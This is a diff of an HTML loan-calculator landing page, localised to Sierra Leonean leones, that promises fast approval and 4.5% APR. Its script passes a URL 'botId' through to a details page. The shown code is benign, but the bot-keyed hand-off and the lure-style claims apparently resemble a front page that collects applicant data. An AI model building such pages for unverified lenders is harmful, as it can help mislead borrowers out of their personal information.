@@ -1,273 +1,629 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Calculator</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<style>
+    <title>SLE Loan Calculator</title>
 
-body{
-font-family: Arial, sans-serif;
-background:#000;
-color:white;
-text-align:center;
-margin:0;
-padding:20px;
-}
+    <style>
 
-.container{
-max-width:420px;
-margin:auto;
-}
+        * {
+            box-sizing: border-box;
+        }
 
-h1{
-font-size:24px;
-margin-bottom:5px;
-}
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
 
-.subtitle{
-color:#bbb;
-font-size:14px;
-margin-bottom:20px;
-}
+        .container {
+            max-width: 420px;
+            margin: auto;
+        }
 
-.card{
-background:white;
-color:black;
-padding:25px;
-border-radius:20px;
-box-shadow:0 10px 25px rgba(0,0,0,0.3);
-}
+        h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
 
-.amount{
-font-size:28px;
-margin:10px 0;
-}
+        .subtitle {
+            color: #bbb;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
 
-.slider{
-width:100%;
-}
+        .card {
+            background: white;
+            color: black;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
 
-.labels{
-display:flex;
-justify-content:space-between;
-font-size:12px;
-color:#888;
-margin-top:5px;
-}
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #111;
+        }
 
-.term-buttons{
-display:grid;
-grid-template-columns:repeat(3,1fr);
-gap:10px;
-margin-top:15px;
-}
+        .slider {
+            width: 100%;
+            cursor: pointer;
+        }
 
-.term{
-padding:10px;
-border-radius:10px;
-background:#eee;
-border:none;
-cursor:pointer;
-}
+        .labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+        }
 
-.term.active{
-background:linear-gradient(90deg,#ff9800,#ff7043);
-color:white;
-}
+        .term-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
 
-.result{
-background:#f1f1f1;
-padding:20px;
-border-radius:15px;
-margin-top:20px;
-}
+        .term {
+            padding: 10px;
+            border-radius: 10px;
+            background: #eee;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+        }
 
-.payment{
-font-size:26px;
-margin-top:5px;
-}
+        .term:hover {
+            background: #ddd;
+        }
 
-.apply{
-margin-top:20px;
-width:100%;
-padding:15px;
-border:none;
-border-radius:12px;
-font-size:18px;
-color:white;
-cursor:pointer;
-background:linear-gradient(90deg,#ff9800,#ff7043);
-box-shadow:0 5px 15px rgba(0,0,0,0.2);
-}
+        .term.active {
+            background: linear-gradient(90deg, #ff9800, #ff7043);
+            color: white;
+        }
 
-.info{
-background:#f5f5f5;
-margin-top:15px;
-padding:15px;
-border-radius:15px;
-display:flex;
-align-items:center;
-gap:15px;
-}
+        .result {
+            background: #f1f1f1;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+        }
 
-.icon{
-width:40px;
-height:40px;
-border-radius:50%;
-background:#4a2c6b;
-display:flex;
-align-items:center;
-justify-content:center;
-color:white;
-font-size:20px;
-}
+        .payment {
+            font-size: 26px;
+            font-weight: bold;
+            margin-top: 5px;
+        }
 
-</style>
+        .apply {
+            margin-top: 20px;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            background: linear-gradient(90deg, #ff9800, #ff7043);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: 0.2s;
+        }
+
+        .apply:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 7px 18px rgba(0, 0, 0, 0.25);
+        }
+
+        .info {
+            background: #f5f5f5;
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-align: left;
+        }
+
+        .icon {
+            width: 40px;
+            height: 40px;
+            flex-shrink: 0;
+            border-radius: 50%;
+            background: #4a2c6b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .info b {
+            font-size: 14px;
+        }
+
+        .info small {
+            color: #777;
+        }
+
+    </style>
 </head>
+
 
 <body>
 
+
 <div class="container">
 
-<h1>Get Your Loan Approved Fast</h1>
-<div class="subtitle">Quick approval • Competitive rates • Flexible terms</div>
 
-<div class="card">
+    <h1>
+        Get Your Loan Approved Fast
+    </h1>
 
-<h2>Loan Calculator</h2>
+    <div class="subtitle">
+        Quick approval • Competitive rates • Flexible terms
+    </div>
 
-<p>LOAN AMOUNT</p>
-<div class="amount" id="loanAmount">$100</div>
 
-<input type="range" min="100" max="50000" value="100" step="100" class="slider" id="loanSlider">
+    <div class="card">
 
-<div class="labels">
-<span>$100</span>
-<span>$50,000</span>
+
+        <h2>
+            Loan Calculator
+        </h2>
+
+
+        <p>
+            LOAN AMOUNT
+        </p>
+
+
+        <div
+            class="amount"
+            id="loanAmount"
+        >
+            SLE 500
+        </div>
+
+
+        <input
+            type="range"
+            min="500"
+            max="100000"
+            value="500"
+            step="500"
+            class="slider"
+            id="loanSlider"
+        >
+
+
+        <div class="labels">
+
+            <span>
+                SLE 500
+            </span>
+
+            <span>
+                SLE 100,000
+            </span>
+
+        </div>
+
+
+        <h3 style="margin-top:20px;">
+            Loan Term
+        </h3>
+
+
+        <div id="months">
+            12 months
+        </div>
+
+
+        <div class="term-buttons">
+
+            <button
+                class="term"
+                data-month="6"
+            >
+                6 months
+            </button>
+
+            <button
+                class="term active"
+                data-month="12"
+            >
+                12 months
+            </button>
+
+            <button
+                class="term"
+                data-month="24"
+            >
+                24 months
+            </button>
+
+            <button
+                class="term"
+                data-month="36"
+            >
+                36 months
+            </button>
+
+            <button
+                class="term"
+                data-month="48"
+            >
+                48 months
+            </button>
+
+            <button
+                class="term"
+                data-month="60"
+            >
+                60 months
+            </button>
+
+        </div>
+
+
+        <div class="result">
+
+            <div>
+                MONTHLY PAYMENT
+            </div>
+
+            <div
+                class="payment"
+                id="payment"
+            >
+                SLE 0.00
+            </div>
+
+            <div style="font-size:12px;color:#777;">
+                Interest rate: 4.5% APR
+            </div>
+
+        </div>
+
+
+        <button
+            class="apply"
+            onclick="applyLoan()"
+        >
+            APPLY NOW
+        </button>
+
+
+        <div class="info">
+
+            <div class="icon">
+                ⚡
+            </div>
+
+            <div>
+
+                <b>
+                    Fast Approval
+                </b>
+
+                <br>
+
+                <small>
+                    Within 24 hours
+                </small>
+
+            </div>
+
+        </div>
+
+
+        <div class="info">
+
+            <div class="icon">
+                💰
+            </div>
+
+            <div>
+
+                <b>
+                    Low Rates
+                </b>
+
+                <br>
+
+                <small>
+                    From 4.5% APR
+                </small>
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+
 </div>
 
-<h3 style="margin-top:20px;">Loan Term</h3>
-
-<div id="months">12 months</div>
-
-<div class="term-buttons">
-<button class="term" data-month="6">6 months</button>
-<button class="term active" data-month="12">12 months</button>
-<button class="term" data-month="24">24 months</button>
-<button class="term" data-month="36">36 months</button>
-<button class="term" data-month="48">48 months</button>
-<button class="term" data-month="60">60 months</button>
-</div>
-
-<div class="result">
-<div>MONTHLY PAYMENT</div>
-<div class="payment" id="payment">$0.00</div>
-<div style="font-size:12px;color:#777;">Interest rate: 4.5% APR</div>
-</div>
-
-<button class="apply" onclick="applyLoan()">APPLY NOW</button>
-
-<div class="info">
-<div class="icon">⚡</div>
-<div>
-<b>Fast Approval</b><br>
-<small>Within 24 hours</small>
-</div>
-</div>
-
-<div class="info">
-<div class="icon">💰</div>
-<div>
-<b>Low Rates</b><br>
-<small>From 8%</small>
-</div>
-</div>
-
-</div>
-
-</div>
 
 <script>
 
-/* GET BOT ID FROM URL */
 
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId') || window.location.pathname.split('/').pop();
+/* ==========================================
+   GET BOT ID FROM URL
+========================================== */
+
+const params = new URLSearchParams(
+    window.location.search
+);
+
+const botId =
+    params.get("botId") ||
+    window.location.pathname.split("/").pop();
+
 
 if (!botId) {
-alert("Invalid access link");
-throw new Error();
+
+    alert("Invalid access link");
+
+    throw new Error("Missing botId");
+
 }
 
-/* SAVE BOT ID */
 
-localStorage.setItem("botId", botId);
+/* ==========================================
+   SAVE BOT ID
+========================================== */
+
+localStorage.setItem(
+    "botId",
+    botId
+);
 
 
-/* CALCULATOR LOGIC */
+/* ==========================================
+   CALCULATOR ELEMENTS
+========================================== */
 
-let slider = document.getElementById("loanSlider");
-let loanAmount = document.getElementById("loanAmount");
-let payment = document.getElementById("payment");
-let monthsDisplay = document.getElementById("months");
+const slider =
+    document.getElementById("loanSlider");
+
+const loanAmount =
+    document.getElementById("loanAmount");
+
+const payment =
+    document.getElementById("payment");
+
+const monthsDisplay =
+    document.getElementById("months");
+
+
+/* ==========================================
+   DEFAULT LOAN TERM
+========================================== */
 
 let months = 12;
-const rate = 0.045/12;
 
-function calculate(){
 
-let P = slider.value;
-let n = months;
-let r = rate;
+/*
+ * 4.5% APR
+ *
+ * Monthly interest rate:
+ *
+ * 4.5 / 12
+ */
 
-let M = (P*r)/(1-Math.pow((1+r),-n));
+const rate = 0.045 / 12;
 
-loanAmount.innerText = "$" + Number(P).toLocaleString();
-payment.innerText = "$" + M.toFixed(2);
+
+/* ==========================================
+   SLE CURRENCY FORMATTER
+========================================== */
+
+function formatSLE(amount) {
+
+    return "SLE " + Number(amount).toLocaleString(
+        "en-SL",
+        {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        }
+    );
 
 }
 
-slider.oninput = calculate;
 
-document.querySelectorAll(".term").forEach(btn=>{
-btn.onclick = function(){
+/* ==========================================
+   CALCULATE MONTHLY PAYMENT
+========================================== */
 
-document.querySelectorAll(".term").forEach(b=>b.classList.remove("active"));
-this.classList.add("active");
+function calculate() {
 
-months = this.dataset.month;
+    const P = Number(slider.value);
 
-monthsDisplay.innerText = months + " months";
+    const n = Number(months);
+
+    const r = rate;
+
+
+    /*
+     * Loan payment formula
+     */
+
+    const M =
+        (P * r) /
+        (1 - Math.pow(1 + r, -n));
+
+
+    /*
+     * Display loan amount
+     */
+
+    loanAmount.innerText =
+        formatSLE(P);
+
+
+    /*
+     * Display monthly payment
+     */
+
+    payment.innerText =
+        formatSLE(M);
+
+}
+
+
+/* ==========================================
+   SLIDER
+========================================== */
+
+slider.oninput = function () {
+
+    calculate();
+
+};
+
+
+/* ==========================================
+   LOAN TERM BUTTONS
+========================================== */
+
+document
+    .querySelectorAll(".term")
+    .forEach(function (btn) {
+
+        btn.onclick = function () {
+
+
+            /*
+             * Remove active
+             * from all buttons
+             */
+
+            document
+                .querySelectorAll(".term")
+                .forEach(function (button) {
+
+                    button.classList.remove("active");
+
+                });
+
+
+            /*
+             * Activate selected button
+             */
+
+            this.classList.add("active");
+
+
+            /*
+             * Get selected months
+             */
+
+            months =
+                Number(this.dataset.month);
+
+
+            /*
+             * Display months
+             */
+
+            monthsDisplay.innerText =
+                months + " months";
+
+
+            /*
+             * Recalculate
+             */
+
+            calculate();
+
+        };
+
+    });
+
+
+/* ==========================================
+   APPLY BUTTON
+========================================== */
+
+function applyLoan() {
+
+
+    /*
+     * Get selected loan amount
+     */
+
+    const selectedAmount =
+        Number(slider.value);
+
+
+    /*
+     * Save loan amount to localStorage
+     *
+     * The stored value is SLE.
+     *
+     * Example:
+     *
+     * 50000
+     *
+     */
+
+    localStorage.setItem(
+        "loanAmount",
+        selectedAmount
+    );
+
+
+    /*
+     * Also save selected loan term
+     */
+
+    localStorage.setItem(
+        "loanTerm",
+        months
+    );
+
+
+    /*
+     * Get bot ID
+     */
+
+    const savedBotId =
+        localStorage.getItem("botId");
+
+
+    /*
+     * Redirect to details page
+     */
+
+    window.location.href =
+        `details.html?botId=${encodeURIComponent(savedBotId)}`;
+
+}
+
+
+/* ==========================================
+   INITIAL CALCULATION
+========================================== */
 
 calculate();
 
-}
-})
-
-
-/* APPLY BUTTON */
-
-function applyLoan(){
-
-/* SAVE LOAN AMOUNT */
-
-localStorage.setItem("loanAmount", slider.value);
-
-/* GET BOT ID */
-
-const botId = localStorage.getItem("botId");
-
-/* REDIRECT */
-
-window.location.href = `details.html?botId=${botId}`;
-
-}
-
-calculate();
 
 </script>
+
 
 </body>
 </html>
